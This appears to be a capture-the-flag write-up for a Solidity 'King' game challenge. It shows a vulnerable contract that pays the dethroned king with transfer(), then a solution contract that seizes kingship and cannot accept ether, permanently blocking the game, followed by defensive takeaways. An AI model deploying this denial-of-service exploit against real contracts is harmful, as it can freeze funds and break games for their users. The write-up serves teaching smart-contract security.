## Challenge
~~~
The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
`

## Solution

```
contract NonPayableContract {
    address king = 0xcd105d4DfAe79CA0Fc764cb4B1013492fF7451C1;
    uint256 startPrize = 1000000000000000;

    constructor() payable {}

    function sendEth() external returns (bool) {
        (bool success,) = payable(king).call{value:startPrize + 1}("");
        return success;
    }
}
```

When the NonPayableContract becomes a king, it cannot be changed as the `transfer()` will always revert.
## Key takeaways and useful resources

We cannot assume that the contract we are trying to send ether can accept it. Another important pattern which is not implemented here is the CEI - Checks, Effects, Interactions.

[CEI pattern article](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html)